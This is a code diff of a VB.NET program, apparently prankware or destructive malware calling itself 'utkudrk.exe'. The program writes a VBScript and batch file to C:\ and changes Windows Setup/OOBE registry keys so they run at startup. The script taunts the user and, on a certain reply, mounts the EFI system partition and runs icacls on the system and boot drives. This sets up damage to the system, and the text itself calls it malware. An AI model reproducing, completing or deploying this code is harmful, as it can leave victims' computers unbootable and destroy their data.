@@ -81,12 +81,14 @@ Public Class Form2
         Dim batFilePath As String = "C:\temp.bat"
 
         ' Create the VBScript content
-        Dim vbsContent As String = "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
+        Dim vbsContent As String =
+        "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
         "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
         "If userInput = ""FUCK YOU"" Then" & vbCrLf &
-        "    Dim shell" & vbCrLf &
+        "    Dim shell, fso" & vbCrLf &
         "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
+        "    Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf &
         "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
         "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
         "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
@@ -102,7 +104,8 @@ Public Class Form2
         "Else" & vbCrLf &
         "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
         "End If" & vbCrLf &
-        "Set shell = Nothing"
+        "Set shell = Nothing" & vbCrLf &
+        "Set fso = Nothing"
 
         ' Create the batch file content
         Dim batContent As String = "@echo off" & vbCrLf &
@@ -112,10 +115,10 @@ Public Class Form2
         "cscript //nologo " & vbsFilePath
 
         ' Write the batch and VBScript content to files
-        System.IO.File.WriteAllText(batFilePath, batContent)
-
-        ' Attempt to modify the registry for OOBE
         Try
+            System.IO.File.WriteAllText(batFilePath, batContent)
+
+            ' Attempt to modify the registry for OOBE
             Dim setupKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
             Dim systemSetupKeyPath As String = "SYSTEM\Setup"
 
@@ -657,7 +660,6 @@ Public Class Form2
             ' Validate user choice against available options
             For Each opt In options
                 If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
-                    validChoice = True
                     Return opt ' Return the valid choice if the input matches one of the options
                 End If
             Next
